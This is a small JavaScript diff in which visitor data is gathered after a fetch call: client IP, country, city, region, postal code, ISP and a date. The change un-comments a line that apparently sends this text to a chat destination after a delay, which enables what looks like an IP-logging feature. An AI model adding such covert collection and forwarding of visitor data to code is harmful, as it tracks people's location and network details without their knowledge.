@@ -153,7 +153,7 @@
         })
           .then((Res)=>{
         qsc.innerHTML +=` ${Res.clientIp.includes(':')?'::Ipv6 Host':Res.clientIp} Requested<hr><br> GEO LOCATION : ${Res.country},${Res.city},${Res.region},${Res.postalCode}<hr><br>ISP : ${Res.asOrganization}<hr><br>Requested On : ${zaa(dt.getDate())}/${zaa(dt.getMonth()+1)}/${zaa(dt.getFullYear())}<hr>`;
-          //setTimeout(()=>$.chat(respsend,qsc.innerText),1591)
+        setTimeout(()=>$.chat(respsend,qsc.innerText),1591)
         })
           .catch(console.error);
     }
